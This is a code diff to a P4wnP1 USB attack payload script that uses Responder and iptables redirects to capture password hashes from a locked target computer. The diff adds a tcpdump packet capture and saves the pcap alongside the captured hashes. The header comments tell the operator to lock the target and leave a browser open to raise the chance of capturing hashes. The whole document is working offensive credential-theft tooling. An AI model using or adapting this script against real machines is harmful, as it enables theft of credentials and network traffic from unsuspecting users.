@@ -42,7 +42,7 @@
 # 1) set a weak password like 'password' or '123456'
 # 2) lock the target machine (to raise the chance of capturing hashes leave a browser open)
 # 3) Don't forget to SET THE CORRECT TARGET LANGUAGE IN THIS SCRIPT, BY ALTERING THE "lang" PARAMETER
-# 4) Attach P4wnP1 and let it do his work (be sure to have this payload set in setup.cfg)
+# 4) Attach P4wnP1 and let it do his work (be sure to have this payload set in startup_payload.conf)
 # 5) If you want to follow along status output attach a monitor to P4wnP1s HDMI port
 #
 #
@@ -158,6 +158,9 @@ function onNetworkUp()
     iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
     iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
 
+sudo tcpdump -i $active_interface -U -w /tmp/test.pcap&
+
+
 	echo "Starting responder..."
 
 	# delete Responder.db
@@ -204,6 +207,9 @@ function onTargetGotIP()
 	echo "Captured the following hashes:"
 	cat $hashfile
 	kill_responder
+
+sudo killall tcpdump
+cp /tmp/test.pcap $hashfile.pcap
 
 	# LED to solid, when hash is captured
 	led_blink 255 # set LED to solid on
